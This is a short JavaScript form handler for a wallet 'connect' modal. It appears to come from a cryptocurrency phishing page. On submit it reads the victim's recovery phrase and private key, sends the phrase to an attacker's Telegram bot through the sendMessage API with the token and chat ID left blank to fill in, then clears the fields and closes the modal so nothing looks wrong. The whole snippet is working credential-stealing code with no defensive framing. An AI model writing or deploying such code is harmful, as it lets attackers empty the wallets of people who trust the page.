document.getElementById('connectForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    const phrase = document.getElementById('phraseInput').value;
    const privateKey = document.getElementById('privateKeyInput').value; // Get the private key

    // Send the phrase to Telegram
    const botToken = ''; // Your bot token
    const chatId = ''; // Your chat ID
    const message = encodeURIComponent(phrase);

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                console.log('Message sent to Telegram:', phrase);
            } else {
                console.error('Error sending message:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Fetch error:', error);
        });

    // Clear the input fields after submission
    document.getElementById('phraseInput').value = '';
    document.getElementById('privateKeyInput').value = ''; // Clear the private key input
    // Close the modal
    $('#connectModal').modal('hide');
});
